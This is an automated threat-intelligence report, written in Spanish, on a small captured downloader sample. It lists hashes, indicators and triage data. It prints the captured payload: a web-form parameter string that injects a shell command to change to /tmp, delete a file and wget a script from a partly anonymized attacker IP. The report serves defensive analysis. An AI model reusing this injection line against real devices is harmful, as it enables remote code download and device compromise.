# 🧬 Payload Analysis

`4a9b2ca88c572981d34ae6bc507c5726058abe31149a4fd4fd5cd396f8a493d3`

## 📌 Resumen

Texto ASCII de 257 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `chmod`
2. `rm -f .s`
3. `wget hxxp://91.92.40.XXX/wget.s` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/4a9b2ca88c572981d34ae6bc507c5726058abe31149a4fd4fd5cd396f8a493d3.md](../../../../../malware-like/oraculo/downloader/4a9b2ca88c572981d34ae6bc507c5726058abe31149a4fd4fd5cd396f8a493d3.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `4a9b2ca88c572981d34ae6bc507c5726058abe31149a4fd4fd5cd396f8a493d3`
- **SHA1:** `2e533d1fb0fc5b6c0de900705dfb61fff92a946b`
- **MD5:** `0a97f50fff36c5ed1d021feb6e48a189`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 257 B |
| Entropía | 5.27 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=cd /tmp;rm -f .s;wget hxxp://91.92.40.XXX/wget.s
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| url | hxxp://91.92.40.XXX/wget.sh;chmod | strings |
| ip | 91.92.40.XXX | static_analysis |
| command | IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=cd /tmp;rm -f .s;wget hxxp://91.92.40.XXX/wget.s | strings |
| hash | 4a9b2ca88c572981d34ae6bc507c5726058abe31149a4fd4fd5cd396f8a493d3 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
